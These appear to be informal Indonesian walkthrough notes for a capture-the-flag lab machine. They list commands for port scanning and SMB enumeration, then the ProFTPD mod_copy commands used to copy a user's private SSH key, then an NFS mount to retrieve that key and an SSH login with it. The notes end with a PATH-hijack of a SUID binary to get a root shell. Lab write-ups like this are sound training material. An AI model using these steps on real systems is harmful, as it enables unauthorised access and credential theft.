1. scanning port -> biasa aja gausah -p-, yang ke ambil cuman 7 kalau ga salah :
-> sudo nmap -sV ip --min-rate 1000 -vv
2. ada port 445 smb -> nmap -p 445 --script=scriptSmbLupaAh ip -vv
3. ketemu user2 smb -> smbclient //ip/user -> ls dalemnya
4. download aja itu log nya di machine mu -> smbget -R --no-pass smb://ip/user/file
5. ada ftp disitu, scan nfs sekarang  port 111 nfs kebuka soalnya -> nmap -p 111 --script=scriptNfsLupa ip -vv
6. searchsploit proftpd versi -> nanti nemu -> pake yang mode_copy -> SITE CPFR, SITE CPTO 
-> nc ip 21 -> SITE CPFR [dir path id rsa ada di log.txt] -> SITE CPTO /var/tmp/id_rsa
7. cd ke /tmp ->  mkdir /mnt/kenobi -> sudo mount ip:/var /mnt/kenobi -> masuk kesana -> cp /mnt/kenobi/tmp/id_rsa ke dir mu
-> chmod 600 ke id rsa -> ssh -i id_rsa kenobi@ip -> cat flag user
8. find / -type f -perm -u=s 2>/dev/null -> cari yang kayaknya gada di gtfobins -> ada /usr/bin/menu
-> coba run itu -> 1 2 3 cuman curl -I localhost, uname -r, ifconfig 
-> echo /bin/sh > curl -> chmod +x curl -> export PATH=/pathmu:$PATH -> jalanin /usr/bin/menu terus pilih 1
-> soalnya itukan curl
